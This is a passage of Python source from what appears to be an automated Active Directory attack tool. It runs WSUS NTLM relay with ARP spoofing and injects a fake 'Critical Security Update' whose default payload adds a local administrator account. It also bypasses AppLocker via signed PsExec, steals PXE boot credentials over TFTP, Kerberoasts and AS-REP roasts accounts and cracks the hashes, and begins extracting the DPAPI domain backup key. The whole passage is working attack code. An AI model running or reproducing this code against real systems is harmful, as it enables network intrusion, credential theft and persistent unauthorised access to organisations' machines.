
        for target in live_hosts[:5]:  # Limit to first 5 hosts
            if target == wsus_server or target == cfg.attacker_ip:
                continue
            log.info(f"🔀 ARP spoof: {target} ↔ {wsus_server}")
            if "bettercap" in spoof_tool:
                bp = run(
                    ["bettercap", "-iface", iface, "-eval",
                     f"set arp.spoof.targets {target}; set arp.spoof.internal true; arp.spoof on"],
                    cfg, bg=True, outfile=cfg.work_dir / f"wsus-arp-{target}.txt"
                )
                if hasattr(bp, 'poll'):
                    bg_procs.append(bp)
            else:
                p1 = run(
                    ["arpspoof", "-i", iface, "-t", target, wsus_server],
                    cfg, bg=True, outfile=cfg.work_dir / f"wsus-arp-{target}-1.txt"
                )
                p2 = run(
                    ["arpspoof", "-i", iface, "-t", wsus_server, target],
                    cfg, bg=True, outfile=cfg.work_dir / f"wsus-arp-{target}-2.txt"
                )
                for p in [p1, p2]:
                    if hasattr(p, 'poll'):
                        bg_procs.append(p)

        ok(f"WSUS relay active on port {port}, spoofing {len(live_hosts)} client(s)...")
        log.info("💡 Tip: Trigger client check-in remotely: wuauclt.exe /detectnow")

        max_wait = cfg.poison_duration * 2  # WSUS needs longer (check-in intervals)
        waited = 0
        captured = False
        while waited < max_wait:
            if relay_output.exists():
                content = relay_output.read_text()
                if re.search(r"authenticated|SUCCEED|machine.*account|\$::",
                             content, re.IGNORECASE):
                    ok("🎣 Captured WSUS machine account NTLM!")
                    captured = True
                    break
            time.sleep(5)
            waited += 5
            if waited % 60 == 0:
                log.info(f"⏳ WSUS relay listening... ({waited}/{max_wait}s)")

        extract_hashes(cfg)

        if captured:
            success_box("WSUS relay captured machine account authentication")
        else:
            log.warning(f"No WSUS auth captured within {max_wait}s")
            log.warning("WSUS clients check in every 22h by default; consider --poison-duration 86400")

        return captured

    finally:
        log.info("🛑 Stopping WSUS relay...")
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)

        # Clean up iptables rules
        log.info("🧹 Removing iptables redirect rules...")
        run(["iptables", "-t", "nat", "-D", "PREROUTING",
             "-p", "tcp", "--dport", str(port), "-j", "REDIRECT",
             "--to-ports", str(port)], cfg, timeout=10)

        # Restore IP forwarding
        try:
            Path("/proc/sys/net/ipv4/ip_forward").write_text(old_forward)
        except Exception:
            pass


def run_wsus_inject(cfg: Config) -> bool:
    """Push a malicious update via WSUS using wsuks.

    If AppLocker is active, uses Microsoft-signed PsExec as the update payload
    to bypass execution restrictions. Updates run as SYSTEM from a trusted path.
    """
    phase_header("PHASE 5b: WSUS UPDATE INJECTION")

    if not tool_exists("wsuks"):
        log.error("wsuks not found (pipx install wsuks --system-site-packages)")
        return False

    wsus_server = cfg.wsus_server or detect_wsus_server(cfg)
    if not wsus_server:
        log.error("No WSUS server specified or found — need --wsus-server")
        return False

    port = cfg.wsus_port or (WSUS_HTTPS_PORT if cfg.wsus_https else WSUS_HTTP_PORT)

    # Determine payload command
    if cfg.custom_cmd:
        payload_cmd = cfg.custom_cmd
    else:
        payload_cmd = f"cmd.exe /c net user /add hax0r P@ssw0rd123! && net localgroup administrators hax0r /add"
        log.warning(f"No --custom-cmd specified, using default: {payload_cmd}")

    # If AppLocker mode, wrap command for bypass
    if cfg.applocker:
        payload_cmd = _build_applocker_cmd(cfg, fallback_cmd=payload_cmd)

    # Find PsExec for signed-binary delivery (bypasses AppLocker)
    psexec_path = None
    for candidate in [
        TOOLS_DIR / "misc_files" / "SysinternalsSuite" / "PsExec64.exe",
        TOOLS_DIR / "misc_files" / "PsExec64.exe",
        Path("/usr/share/windows-resources/binaries/PsExec64.exe"),
    ]:
        if candidate.exists():
            psexec_path = str(candidate)
            break

    output_file = cfg.work_dir / "wsus-inject.txt"

    if psexec_path and cfg.applocker:
        # Use PsExec as the signed binary payload — bypasses AppLocker
        log.info("🔑 Using Microsoft-signed PsExec for AppLocker bypass via WSUS...")
        inject_cmd = [
            "wsuks",
            "--server", wsus_server,
            "--port", str(port),
            "--action", "inject",
            "--executable", psexec_path,
            "--args", f"-accepteula -s -d {payload_cmd}",
            "--title", "Critical Security Update KB5099999",
            "--approve-all",
        ]
    else:
        # Direct injection
        log.info("📦 Injecting malicious WSUS update...")
        inject_cmd = [
            "wsuks",
            "--server", wsus_server,
            "--port", str(port),
            "--action", "inject",
            "--executable", payload_cmd.split()[0] if " " in payload_cmd else "cmd.exe",
            "--args", payload_cmd if " " not in payload_cmd else " ".join(payload_cmd.split()[1:]),
            "--title", "Critical Security Update KB5099999",
            "--approve-all",
        ]

    if cfg.wsus_https:
        inject_cmd += ["--https"]

    result = run(inject_cmd, cfg, timeout=120, outfile=output_file)

    if result.returncode == 0:
        success_box("WSUS update injected successfully")
        ok("Clients will execute payload on next update check")
        detail("Force check-in: wuauclt.exe /detectnow  OR  UsoClient.exe StartScan")
        if cfg.applocker:
            ok("AppLocker bypass: payload delivered via trusted WSUS channel as SYSTEM")
        return True
    else:
        log.error("WSUS injection failed")
        if output_file.exists():
            log.error(output_file.read_text()[-500:])
        return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Phase 6: PXE Boot Image Credential Theft
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_pxe_server(cfg: Config) -> str:
    """Discover PXE/WDS server via nmap scan for TFTP (port 69) and WDS (UDP 4011)."""
    log.info("🔍 Scanning for PXE/WDS servers (TFTP port 69, WDS port 4011)...")

    if not tool_exists("nmap"):
        log.warning("nmap not available for PXE discovery")
        return ""

    target = cfg.specific_target or cfg.target_net or cfg.dc_ip
    if not target:
        return ""

    result = run(
        ["nmap", "-sU", "-n", "-Pn", "--open", "-p", "69,4011", target],
        cfg, timeout=120
    )
    hosts = re.findall(
        r"Nmap scan report for (\d+\.\d+\.\d+\.\d+).*?(?:69|4011)/udp\s+open",
        result.stdout, re.DOTALL
    )
    if hosts:
        pxe = hosts[0]
        ok(f"PXE/TFTP server found: {pxe}")
        return pxe

    log.warning("No PXE/TFTP server detected on network")
    return ""


def run_pxe_attack(cfg: Config) -> bool:
    """Exploit PXE boot environment to extract credentials.

    Attack chain:
    1. Discover PXE server (DHCP broadcast or nmap)
    2. Use pxethiefy to download media variables via TFTP (zero-auth)
    3. Attempt blank-password decryption
    4. If password-protected, generate hashcat hash for offline cracking
    5. Extract Bootstrap.ini, Unattend.xml, VARIABLES.DAT from WIM images
    6. Parse credentials (deployment share creds, domain join creds)
    """
    phase_header("PHASE 6: PXE BOOT CREDENTIAL THEFT")

    iface = cfg.iface or "eth0"
    pxe_dir = cfg.work_dir / "pxe-loot"
    pxe_dir.mkdir(exist_ok=True)

    # Find PXE server
    pxe_server = ""

    # Method 1: Use pxethiefy DHCP broadcast discovery
    pxethiefy_path = find_tool(
        "pxethiefy",
        paths=[
            TOOLS_DIR / "pxethiefy" / "pxethiefy.py",
            TOOLS_DIR / "pxethiefy" / "pxethiefy" / "pxethiefy.py",
        ]
    )

    if pxethiefy_path:
        log.info("🖥️  Using pxethiefy to discover PXE servers via DHCP broadcast...")
        pxe_output = pxe_dir / "pxethiefy-explore.txt"
        result = run(
            pxethiefy_path.split() + ["explore", "-i", iface],
            cfg, timeout=90, outfile=pxe_output
        )

        if pxe_output.exists():
            content = pxe_output.read_text()

            # Check for downloaded media files
            media_files = re.findall(r"Downloaded[:\s]+(\S+\.boot\.var\S*)", content, re.IGNORECASE)
            if not media_files:
                media_files = list(pxe_dir.glob("*.boot.var")) + list(Path(".").glob("*.boot.var"))

            # Check for blank password auto-decrypt
            if re.search(r"blank.*password|no.*password|decrypt.*success", content, re.IGNORECASE):
                ok("🔓 PXE media has NO password — credentials auto-extracted!")
                _parse_pxe_credentials(content, cfg)
                return True

            # Check for hashcat hash (password-protected)
            hashcat_match = re.search(r"(\$sccm\$aes128\$[a-fA-F0-9]+)", content)
            if hashcat_match:
                pxe_hash = hashcat_match.group(1)
                hashfile = pxe_dir / "pxe-hashcat.txt"
                hashfile.write_text(pxe_hash + "\n")
                ok(f"🔐 PXE media is password-protected — hashcat hash saved")
                detail(f"Hash: {pxe_hash[:60]}...")
                detail(f"Crack: hashcat -m 28800 {hashfile} rockyou.txt")

                # Attempt quick crack
                cracked = _try_crack_pxe_hash(hashfile, cfg)
                if cracked and media_files:
                    log.info(f"🔓 Password cracked: {cracked}")
                    media_file = str(media_files[0])
                    decrypt_result = run(
                        pxethiefy_path.split() + ["decrypt", "-p", cracked, "-f", media_file],
                        cfg, timeout=30, outfile=pxe_dir / "pxethiefy-decrypt.txt"
                    )
                    if decrypt_result.returncode == 0:
                        _parse_pxe_credentials(
                            (pxe_dir / "pxethiefy-decrypt.txt").read_text(), cfg
                        )
                        return True
                return False  # Hash saved for offline cracking

            # Check for Management Point / SharpSCCM output
            if re.search(r"ManagementPoint|SMSTSMP|SharpSCCM", content):
                ok("📋 SCCM Management Point info extracted from PXE")
                _parse_pxe_credentials(content, cfg)
                return True

        pxe_server_match = re.search(r"PXE.*?server[:\s]+(\d+\.\d+\.\d+\.\d+)",
                                     pxe_output.read_text() if pxe_output.exists() else "",
                                     re.IGNORECASE)
        if pxe_server_match:
            pxe_server = pxe_server_match.group(1)
    else:
        log.warning("pxethiefy not found — falling back to manual TFTP extraction")

    # Method 2: Manual TFTP extraction (works without pxethiefy)
    if not pxe_server:
        pxe_server = detect_pxe_server(cfg)

    if not pxe_server:
        log.warning("No PXE server found — skipping PXE attack")
        return False

    log.info(f"📂 Attempting manual TFTP file extraction from {pxe_server}...")
    return _manual_tftp_extract(pxe_server, pxe_dir, cfg)


def _manual_tftp_extract(pxe_server: str, pxe_dir: Path, cfg: Config) -> bool:
    """Download and inspect PXE boot files via TFTP (zero authentication).

    Downloads BCD, WIM files, then mounts WIM to extract:
    - Bootstrap.ini (deployment share + creds)
    - Unattend.xml (installation config + potential creds)
    - VARIABLES.DAT (base64-encoded creds)
    """
    got_creds = False

    # Common PXE files to attempt downloading via TFTP
    tftp_files = [
        r"\boot\BCD",
        r"\boot\boot.sdi",
        r"\boot\x64\images\boot.wim",
        r"\boot\x86\images\boot.wim",
        r"\tmp\boot.wim",
        r"\Deploy\Bootstrap.ini",
        r"\SMS\data\variables.dat",
    ]

    if not tool_exists("tftp") and not tool_exists("atftp"):
        log.warning("No TFTP client found (apt install tftp or atftp)")
        return False

    tftp_cmd = "atftp" if tool_exists("atftp") else "tftp"

    for remote_path in tftp_files:
        local_name = remote_path.replace("\\", "_").lstrip("_")
        local_path = pxe_dir / local_name

        log.info(f"  📥 TFTP GET: {remote_path}")
        if tftp_cmd == "atftp":
            result = run(
                ["atftp", "--get", "--remote-file", remote_path,
                 "--local-file", str(local_path), pxe_server],
                cfg, timeout=60
            )
        else:
            result = run(
                ["tftp", pxe_server, "-c", "get", remote_path, str(local_path)],
                cfg, timeout=60
            )

        if local_path.exists() and local_path.stat().st_size > 0:
            ok(f"Downloaded: {local_name} ({local_path.stat().st_size} bytes)")

    # Parse any downloaded Bootstrap.ini directly
    for f in pxe_dir.glob("*Bootstrap*"):
        content = f.read_text(errors="ignore")
        creds = _parse_bootstrap_ini(content, cfg)
        if creds:
            got_creds = True

    # Mount and inspect WIM files
    for wim_file in pxe_dir.glob("*.wim"):
        creds = _extract_from_wim(wim_file, pxe_dir, cfg)
        if creds:
            got_creds = True

    # Check VARIABLES.DAT for base64-encoded credentials
    for dat_file in pxe_dir.glob("*variables*"):
        creds = _parse_variables_dat(dat_file, cfg)
        if creds:
            got_creds = True

    if got_creds:
        success_box("PXE credential extraction successful")
    else:
        log.warning("No credentials found in PXE files (images may require further analysis)")
        log.warning(f"Downloaded files saved in: {pxe_dir}")

    return got_creds


def _extract_from_wim(wim_file: Path, pxe_dir: Path, cfg: Config) -> bool:
    """Mount a WIM file and extract credentials from Bootstrap.ini, Unattend.xml, VARIABLES.DAT."""
    mount_dir = pxe_dir / f"wim-mount-{wim_file.stem}"
    mount_dir.mkdir(exist_ok=True)
    got_creds = False

    if not tool_exists("wimlib-imagex") and not tool_exists("wimmountrw"):
        log.warning("wimtools not found — cannot mount WIM (apt install wimtools)")
        return False

    try:
        log.info(f"📦 Mounting WIM: {wim_file.name}...")

        # Try wimlib-imagex first (more widely available)
        if tool_exists("wimlib-imagex"):
            result = run(
                ["wimlib-imagex", "apply", str(wim_file), "1", str(mount_dir)],
                cfg, timeout=300
            )
        else:
            result = run(
                ["wimmountrw", str(wim_file), str(mount_dir)],
                cfg, timeout=120
            )

        if result.returncode != 0:
            log.warning(f"Failed to mount/extract WIM: {wim_file.name}")
            return False

        ok(f"WIM extracted to {mount_dir}")

        # Search for credential files
        for pattern, parser in [
            ("**/Bootstrap.ini", _parse_bootstrap_ini),
            ("**/bootstrap.ini", _parse_bootstrap_ini),
            ("**/Unattend.xml", _parse_unattend_xml),
            ("**/unattend.xml", _parse_unattend_xml),
            ("**/Autounattend.xml", _parse_unattend_xml),
        ]:
            for found_file in mount_dir.glob(pattern):
                log.info(f"  🔍 Found: {found_file.relative_to(mount_dir)}")
                content = found_file.read_text(errors="ignore")
                if parser(content, cfg):
                    got_creds = True

        # Search for VARIABLES.DAT
        for dat_file in mount_dir.glob("**/VARIABLES.DAT"):
            log.info(f"  🔍 Found: {dat_file.relative_to(mount_dir)}")
            if _parse_variables_dat(dat_file, cfg):
                got_creds = True

        # Search for other interesting files
        for interesting in mount_dir.glob("**/*.ini"):
            content = interesting.read_text(errors="ignore")
            if re.search(r"password|passwd|credential|secret", content, re.IGNORECASE):
                log.info(f"  🔑 Potential credentials in: {interesting.relative_to(mount_dir)}")
                # Copy to loot directory
                loot_file = pxe_dir / f"loot-{interesting.name}"
                loot_file.write_text(content)

    finally:
        # Cleanup mount
        if tool_exists("wimlib-imagex"):
            pass  # apply mode extracts files, no unmount needed
        elif tool_exists("wimumount"):
            run(["wimumount", str(mount_dir)], cfg, timeout=30)

    return got_creds


def _parse_bootstrap_ini(content: str, cfg: Config) -> bool:
    """Parse Bootstrap.ini for deployment share credentials."""
    creds_found = False

    user_match = re.search(r"UserID=(\S+)", content, re.IGNORECASE)
    pass_match = re.search(r"UserPassword=(\S+)", content, re.IGNORECASE)
    domain_match = re.search(r"UserDomain=(\S+)", content, re.IGNORECASE)
    share_match = re.search(r"DeployRoot=(\S+)", content, re.IGNORECASE)

    if user_match:
        user = user_match.group(1)
        password = pass_match.group(1) if pass_match else ""
        domain = domain_match.group(1) if domain_match else ""
        share = share_match.group(1) if share_match else ""

        ok(f"🔑 PXE Bootstrap.ini credentials found!")
        detail(f"User: {domain}\\{user}")
        if password:
            detail(f"Password: {password}")
        if share:
            detail(f"Deployment share: {share}")

        # Save to loot file
        loot = cfg.work_dir / "pxe-creds.txt"
        with open(loot, "a") as f:
            f.write(f"[Bootstrap.ini]\n")
            f.write(f"User: {domain}\\{user}\n")
            f.write(f"Password: {password}\n")
            f.write(f"Share: {share}\n\n")

        # Set as active credentials if we don't have any
        if password and not cfg.has_creds:
            cfg.username = user
            cfg.password = password
            if domain:
                cfg.domain = domain
            ok("🔑 PXE credentials set as active credentials for attack chain")

        creds_found = True

    return creds_found


def _parse_unattend_xml(content: str, cfg: Config) -> bool:
    """Parse Unattend.xml / Autounattend.xml for credentials."""
    creds_found = False

    # Look for plaintext passwords in various XML elements
    patterns = [
        (r"<Password>\s*<Value>([^<]+)</Value>", "Unattend password"),
        (r"<AdministratorPassword>\s*<Value>([^<]+)</Value>", "Admin password"),
        (r"<Username>([^<]+)</Username>.*?<Password>\s*<Value>([^<]+)</Value>",
         "Domain join creds"),
        (r"RunSynchronousCommand.*?<Path>[^<]*net use[^<]*(/user:\S+\s+\S+)", "Net use creds"),
    ]

    for pattern, desc in patterns:
        for match in re.finditer(pattern, content, re.DOTALL | re.IGNORECASE):
            value = match.group(1)
            # Skip base64 "true" markers
            if value.lower() in ("true", "false"):
                continue

            ok(f"🔑 {desc} found in Unattend.xml")
            detail(f"Value: {value}")

            loot = cfg.work_dir / "pxe-creds.txt"
            with open(loot, "a") as f:
                f.write(f"[Unattend.xml - {desc}]\n")
                f.write(f"Value: {value}\n\n")

            creds_found = True

    return creds_found


def _parse_variables_dat(dat_file: Path, cfg: Config) -> bool:
    """Parse VARIABLES.DAT for base64-encoded credentials."""
    import base64
    creds_found = False

    try:
        content = dat_file.read_text(errors="ignore")
    except Exception:
        content = dat_file.read_bytes().decode("utf-16-le", errors="ignore")

    for var_name in ["USERID", "USERPASSWORD", "USERDOMAIN"]:
        match = re.search(rf"{var_name}=(\S+)", content, re.IGNORECASE)
        if match:
            raw_value = match.group(1)
            # Try base64 decode
            try:
                decoded = base64.b64decode(raw_value).decode("utf-8", errors="ignore")
                ok(f"🔑 VARIABLES.DAT: {var_name} = {decoded}")
            except Exception:
                decoded = raw_value
                ok(f"🔑 VARIABLES.DAT: {var_name} = {raw_value}")

            loot = cfg.work_dir / "pxe-creds.txt"
            with open(loot, "a") as f:
                f.write(f"[VARIABLES.DAT]\n{var_name} = {decoded}\n\n")

            # Set credentials
            if var_name == "USERID" and not cfg.username:
                cfg.username = decoded
            elif var_name == "USERPASSWORD" and not cfg.password:
                cfg.password = decoded
            elif var_name == "USERDOMAIN" and not cfg.domain:
                cfg.domain = decoded

            creds_found = True

    if creds_found and cfg.has_creds:
        ok("🔑 PXE credentials set as active credentials for attack chain")

    return creds_found


def _parse_pxe_credentials(output: str, cfg: Config) -> bool:
    """Parse pxethiefy output for SCCM Management Point info and credentials."""
    creds_found = False

    # Management Point URL
    mp_match = re.search(r"SMSTSMP[=:\s]+(\S+)", output, re.IGNORECASE)
    if mp_match:
        ok(f"📋 SCCM Management Point: {mp_match.group(1)}")
        creds_found = True

    # Site code
    site_match = re.search(r"SiteCode[=:\s]+(\S+)", output, re.IGNORECASE)
    if site_match:
        detail(f"Site Code: {site_match.group(1)}")

    # Media GUID
    guid_match = re.search(r"MediaGuid[=:\s]+(\S+)", output, re.IGNORECASE)
    if guid_match:
        detail(f"Media GUID: {guid_match.group(1)}")

    # Network Access Account
    naa_user = re.search(r"NetworkAccess.*?User(?:name)?[=:\s]+(\S+)", output, re.IGNORECASE)
    naa_pass = re.search(r"NetworkAccess.*?Pass(?:word)?[=:\s]+(\S+)", output, re.IGNORECASE)
    if naa_user:
        ok(f"🔑 Network Access Account: {naa_user.group(1)}")
        if naa_pass:
            detail(f"Password: {naa_pass.group(1)}")
            if not cfg.has_creds:
                cfg.username = naa_user.group(1)
                cfg.password = naa_pass.group(1)
        creds_found = True

    # Save all output
    loot = cfg.work_dir / "pxe-creds.txt"
    with open(loot, "a") as f:
        f.write(f"[pxethiefy output]\n{output}\n\n")

    return creds_found


def _try_crack_pxe_hash(hashfile: Path, cfg: Config) -> str:
    """Attempt to crack SCCM PXE media password hash."""
    cracked_file = cfg.work_dir / "pxe-loot" / "pxe-cracked.txt"

    wordlist = None
    for wl in WORDLISTS:
        if wl.exists() and wl.suffix != ".gz":
            wordlist = wl
            break
    if not wordlist:
        return ""

    # hashcat mode 28800 = SCCM PXE media
    if tool_exists("hashcat"):
        log.info(f"⚙️  Cracking PXE hash with hashcat (mode 28800)...")
        run(
            ["hashcat", "-m", "28800", str(hashfile), str(wordlist),
             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet"],
            cfg, timeout=120
        )
        if cracked_file.exists() and cracked_file.stat().st_size > 0:
            return _first_line(cracked_file.read_text())

    return ""


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Kerberoasting + AS-REP Roasting
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _kerberoast(cfg: Config) -> list[str]:
    """Run impacket-GetUserSPNs to harvest TGS-REP hashes for cracking."""
    if not tool_exists("impacket-GetUserSPNs"):
        log.warning("impacket-GetUserSPNs not found — skipping Kerberoasting")
        return []

    hashfile = cfg.work_dir / "kerberoast-hashes.txt"
    log.info("Requesting TGS tickets for service accounts (Kerberoasting)...")

    cmd = ["impacket-GetUserSPNs"]
    if cfg.nthash:
        cmd += [f"{cfg.domain}/{cfg.username}", "-hashes", f":{cfg.nthash}"]
    else:
        cmd += [f"{cfg.domain}/{cfg.username}:{cfg.password}"]
    cmd += ["-dc-ip", cfg.dc_ip, "-request", "-outputfile", str(hashfile)]

    result = run(cmd, cfg, timeout=120)
    if result.returncode != 0:
        log.warning(f"GetUserSPNs failed: {_first_line(result.stderr or '')}")
        return []

    # Count SPNs found
    spn_count = len(re.findall(r"SPN\s+", result.stdout or "", re.IGNORECASE))
    if spn_count:
        ok(f"Found {spn_count} SPN(s) with Kerberoastable service accounts")

    if not hashfile.exists() or hashfile.stat().st_size == 0:
        log.warning("No Kerberoast hashes obtained (no SPNs or all AES-only)")
        return []

    hashes = [l.strip() for l in hashfile.read_text().splitlines() if l.strip()]
    ok(f"Captured {len(hashes)} Kerberoast TGS-REP hash(es)")
    return hashes


def _asrep_roast(cfg: Config) -> list[str]:
    """Run impacket-GetNPUsers to harvest AS-REP hashes for accounts without pre-auth."""
    if not tool_exists("impacket-GetNPUsers"):
        log.warning("impacket-GetNPUsers not found — skipping AS-REP Roasting")
        return []

    hashfile = cfg.work_dir / "asrep-hashes.txt"
    log.info("Checking for accounts without Kerberos pre-authentication (AS-REP Roasting)...")

    # With creds, we can enumerate and request all at once
    cmd = ["impacket-GetNPUsers"]
    if cfg.nthash:
        cmd += [f"{cfg.domain}/{cfg.username}", "-hashes", f":{cfg.nthash}"]
    else:
        cmd += [f"{cfg.domain}/{cfg.username}:{cfg.password}"]
    cmd += ["-dc-ip", cfg.dc_ip, "-request", "-format", "hashcat",
            "-outputfile", str(hashfile)]

    # If we have a user list, use it instead for unauthenticated mode
    users_file = cfg.work_dir / "domain-users.txt"
    if users_file.exists() and not cfg.has_creds:
        cmd = [
            "impacket-GetNPUsers", f"{cfg.domain}/",
            "-dc-ip", cfg.dc_ip,
            "-usersfile", str(users_file),
            "-format", "hashcat",
            "-outputfile", str(hashfile),
        ]

    result = run(cmd, cfg, timeout=120)
    if result.returncode != 0:
        log.warning(f"GetNPUsers failed: {_first_line(result.stderr or '')}")
        return []

    if not hashfile.exists() or hashfile.stat().st_size == 0:
        log.info("No AS-REP roastable accounts found (all have pre-auth enabled)")
        return []

    hashes = [l.strip() for l in hashfile.read_text().splitlines() if l.strip()]
    ok(f"Captured {len(hashes)} AS-REP hash(es)")
    return hashes


def _crack_roast_hashes(hashfile: Path, mode: int, label: str, cfg: Config) -> list[str]:
    """Crack Kerberoast or AS-REP hashes with hashcat. Returns list of cracked passwords."""
    if not hashfile.exists() or hashfile.stat().st_size == 0:
        return []

    cracked_file = hashfile.parent / f"{hashfile.stem}-cracked.txt"

    # Find wordlist (prefer uncompressed, auto-decompress .gz)
    wordlist = None
    for wl in WORDLISTS:
        if wl.exists() and wl.suffix != ".gz":
            wordlist = wl
            break
        if wl.suffix == ".gz" and wl.exists():
            plain = wl.with_suffix("")
            if plain.exists():
                wordlist = plain
                break
            log.info(f"📦 Decompressing {wl.name}...")
            run(["gunzip", "-k", str(wl)], cfg, timeout=60)
            if plain.exists():
                wordlist = plain
                break

    if not tool_exists("hashcat"):
        log.warning(f"hashcat not found — cannot crack {label} hashes")
        detail(f"Crack manually: hashcat -m {mode} {hashfile} <wordlist>")
        return []

    # Quick-crack: extract usernames from hashes and try username=password patterns
    usernames = set()
    for line in hashfile.read_text().splitlines():
        if "$" in line:
            # Kerberoast: $krb5tgs$23$*USER$DOMAIN*...
            # AS-REP: $krb5asrep$23$USER@DOMAIN:...
            user_match = re.search(r"\$\*?([^$@:*]+?)[\$@*]", line)
            if user_match:
                usernames.add(user_match.group(1))

    if usernames:
        mini_wl = hashfile.parent / f"{hashfile.stem}-quick-wordlist.txt"
        patterns = []
        for u in usernames:
            patterns += [u, u.lower(), u.upper(), u.capitalize(),
                         f"{u}1", f"{u}123", f"{u}!", f"{u}1!",
                         u[::-1]]
        patterns += ["password", "Password1", "P@ssw0rd", "Welcome1",
                     "Changeme1", "Winter2026", "Summer2026", "Admin123",
                     "Company1", "letmein", "qwerty", "123456"]
        mini_wl.write_text("\n".join(patterns) + "\n")
        log.info(f"⚡ Quick-crack: trying {len(patterns)} username patterns for {label}...")
        run(
            ["hashcat", "-m", str(mode), str(hashfile), str(mini_wl),
             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
             "--runtime=10"],
            cfg, timeout=15
        )
        if cracked_file.exists() and cracked_file.stat().st_size > 0:
            ok(f"⚡ Quick-crack hit for {label}!")

    if not wordlist:
        log.warning(f"No wordlist found for {label} cracking")
        if cracked_file.exists() and cracked_file.stat().st_size > 0:
            # Quick-crack found something even without wordlist
            pass
        else:
            return []

    if wordlist:
        log.info(f"Cracking {label} hashes (hashcat mode {mode})...")
        run(
            ["hashcat", "-m", str(mode), str(hashfile), str(wordlist),
             "--outfile", str(cracked_file), "--outfile-format=2", "--quiet",
             "--runtime=240"],  # Hard cap: 4 minutes max
            cfg, timeout=300    # Process kill safety net: 5 minutes
        )

    if not cracked_file.exists() or cracked_file.stat().st_size == 0:
        log.warning(f"No {label} passwords cracked with wordlist {wordlist.name}")
        return []

    cracked = [l.strip() for l in cracked_file.read_text().splitlines() if l.strip()]
    ok(f"Cracked {len(cracked)} {label} password(s)!")
    for pw in cracked:
        detail(f"  {pw}")
    return cracked


def run_roast_attack(cfg: Config) -> bool:
    """Kerberoast + AS-REP Roast to harvest crackable service account hashes."""
    phase_header("KERBEROASTING + AS-REP ROASTING")

    if not cfg.has_creds:
        log.error("Roasting requires domain credentials (-u/-p or -H)")
        return False

    any_cracked = False

    # 1. Kerberoasting
    kerb_hashes = _kerberoast(cfg)
    if kerb_hashes:
        hashfile = cfg.work_dir / "kerberoast-hashes.txt"
        # Detect hash type from prefix
        sample = kerb_hashes[0] if kerb_hashes else ""
        if "$krb5tgs$17$" in sample or "$krb5tgs$18$" in sample:
            mode = 19700  # AES
            detail("Hash type: Kerberos 5 TGS-REP AES (mode 19700)")
        else:
            mode = 13100  # RC4 (default, $krb5tgs$23$)
            detail("Hash type: Kerberos 5 TGS-REP RC4 (mode 13100)")

        cracked = _crack_roast_hashes(hashfile, mode, "Kerberoast", cfg)
        if cracked:
            any_cracked = True
            # Save cracked creds
            cred_file = cfg.work_dir / "kerberoast-cracked.txt"
            cred_file.write_text("\n".join(cracked) + "\n")
            success_box(f"Kerberoast: {len(cracked)} password(s) cracked!")

    separator()

    # 2. AS-REP Roasting
    asrep_hashes = _asrep_roast(cfg)
    if asrep_hashes:
        hashfile = cfg.work_dir / "asrep-hashes.txt"
        cracked = _crack_roast_hashes(hashfile, 18200, "AS-REP", cfg)
        if cracked:
            any_cracked = True
            cred_file = cfg.work_dir / "asrep-cracked.txt"
            cred_file.write_text("\n".join(cracked) + "\n")
            success_box(f"AS-REP Roast: {len(cracked)} password(s) cracked!")

    if not kerb_hashes and not asrep_hashes:
        log.warning("No roastable accounts found in the domain")
    elif not any_cracked and (kerb_hashes or asrep_hashes):
        log.warning("Hashes captured but not cracked — try larger wordlists or rules")
        detail(f"Kerberoast hashes: {cfg.work_dir / 'kerberoast-hashes.txt'}")
        detail(f"AS-REP hashes: {cfg.work_dir / 'asrep-hashes.txt'}")

    return any_cracked


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DPAPI Backup Key Extraction
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_dpapi_backup(cfg: Config) -> bool:
    """Extract DPAPI domain backup key after successful DCSync."""
    phase_header("DPAPI BACKUP KEY EXTRACTION")

    if not tool_exists("impacket-dpapi"):
        log.warning("impacket-dpapi not found — skipping DPAPI backup key extraction")
        return False

    if not cfg.has_creds:
        log.error("DPAPI backup key extraction requires domain credentials")
        return False

    # Check if secretsdump ran successfully
    dump_file = cfg.work_dir / "secretsdump.txt"
    if dump_file.exists() and ":::" in dump_file.read_text():
        ok("DCSync output found — proceeding with DPAPI backup key extraction")
    else:
        log.warning("No secretsdump output found — DPAPI extraction may fail without DA privileges")

    log.info("Extracting DPAPI domain backup key...")
    pvk_output = cfg.work_dir / "dpapi-backupkey.pvk"

    # Format: impacket-dpapi backupkeys -t domain/user:password@DC_IP --export
    target = cfg.dc_ip or cfg.dc_fqdn
    cmd = ["impacket-dpapi", "backupkeys", "--export"]
    if cfg.nthash:
        cmd += ["-t", f"{cfg.domain}/{cfg.username}@{target}",
                "-hashes", f"aad3b435b51404eeaad3b435b51404ee:{cfg.nthash}"]
    else:
        cmd += ["-t", f"{cfg.domain}/{cfg.username}:{cfg.password}@{target}"]

    result = run(cmd, cfg, timeout=120, outfile=cfg.work_dir / "dpapi-backup.txt")

    if result.returncode != 0:
        log.warning(f"DPAPI backup key extraction failed: {_first_line(result.stderr or '')}")
        return False

    # Look for .pvk file — impacket-dpapi writes to cwd or work_dir
    pvk_found = False
    for candidate in [
        Path(".") / "ntds_capi_0_*.pvk",
        Path(".") / "*.pvk",
        cfg.work_dir / "ntds_capi_0_*.pvk",
        cfg.work_dir / "*.pvk",
        Path.home() / "ntds_capi_0_*.pvk",
        Path.home() / "*.pvk",
    ]:
        for pvk in candidate.parent.glob(candidate.name):
            try:
                import shutil as _shutil
